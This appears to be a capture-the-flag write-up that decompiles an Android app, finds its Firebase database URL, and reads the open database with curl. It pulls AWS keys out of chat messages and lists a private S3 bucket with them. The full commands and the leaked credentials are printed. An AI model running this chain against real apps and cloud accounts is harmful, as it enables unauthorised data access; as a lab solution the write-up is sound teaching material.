# parley

## Challenge

```
We found a discarded phone with a custom app on it. See what you can dig out of this.

Target: The name of the database backup file in the cloud storage.
```

## Walkthrough

The first was extracting the APK. I used a popular tool called `apktool` to extract it.

```sh
$ apktool d HijackSparrow.apk
```

Once extracted I inspected the generated `apktool.yml` file to analyze meta information about the application.

```
$ cat apktool.yml
...
unknownFiles:
  firebase-analytics-ktx.properties: '8'
  firebase-analytics.properties: '8'
  firebase-annotations.properties: '8'
  firebase-appcheck-interop.properties: '8'
  firebase-auth-interop.properties: '8'
  firebase-auth-ktx.properties: '8'
  firebase-auth.properties: '8'
...
```

Upon inspection I found many references to firebase, prompting me to inspect further and try find the databases address.

```sh
$ grep -R "firebase" ./
...
res/values/strings.xml:    <string name="firebase_database_URL">https://galleychat-default-rtdb.firebaseio.com/</string>
...
```

Now that I'd determined the databases address it was time to inspect it.

An easy way to check if a firebases permissions are misconfigured to allow read access is to `GET /.json`, if you get anything back than there's permissions issues and you can inspect further with other tooling.

```sh
$ curl https://galleychat-default-rtdb.firebaseio.com/.json | jq
...
{
  "chats": {
    ...
    "IWG0X15CB6VHu8B5T39bPU52kOu2PqPJo8r5XMcd6BCiqg3laH5JTL62": {
        "messages": {
        ...
        "-MqgkS_COYVcgOcEgKE7": {
          "message": "Need your help though, boss needs me to wipe data, what's the access info for the s3 bucket? I swear my brains have been chewed out by the garra rufa, need to act quick.",
          "senderId": "IWG0X15CB6VHu8B5T39bPU52kOu2"
        },
        "-MqglqoQIhth_4Z91Dia": {
          "message": "alright Dory, I got your back. ID: AKIASXOIOIIYVBOHNQ75",
          "senderId": "PqPJo8r5XMcd6BCiqg3laH5JTL62"
        },
        "-MqgmDV96k7e0cJU5iFv": {
          "message": "secret: ld8oygSYdQjAbTEtAHv7RG7B7o2dZrXjJsqjrdYO",
          "senderId": "PqPJo8r5XMcd6BCiqg3laH5JTL62"
        },
        ...
      }
    },
    "IWG0X15CB6VHu8B5T39bPU52kOu2pienkZrKUIOskcIAJpBQARcxV3l1": {
      "messages": {
        ...
        "-MqSYk_Gy_3JWtf06ilr": {
          "message": "Leave nothing behind. Delete all traces watch the logs in s3 chat-westoleashiplul",
          "senderId": "pienkZrKUIOskcIAJpBQARcxV3l1"
        },
        ...
      }
    },
    ...
  },
  "user": {
    ...
  }
}
```

Read permissions were incorrectly configured such that I could read the chats and user info. I summed up the important info to figure out the next step.

```
ID        AKIASXOIOIIYVBOHNQ75
Secret    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
S3 bucket chat-westoleashiplul
```

From here it was obvious that the next step was to read the S3 bucket and we had everything we needed. Using the AWS CLI I listed the files in the S3 bucket.

```sh
$ aws configure
AWS Access Key ID: AKIASXOIOIIYVBOHNQ75
AWS Secret Access Key: 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
Default region name [None]: 
Default output format [None]:

$ aws s3 ls s3://chat-westoleashiplul
2021-12-11 23:25:47       4151 backup-Ducky2-Corned-Latter.enc.gz
```

That looks like what we want!

# Solve

filename: `backup-Ducky2-Corned-Latter.enc.gz`
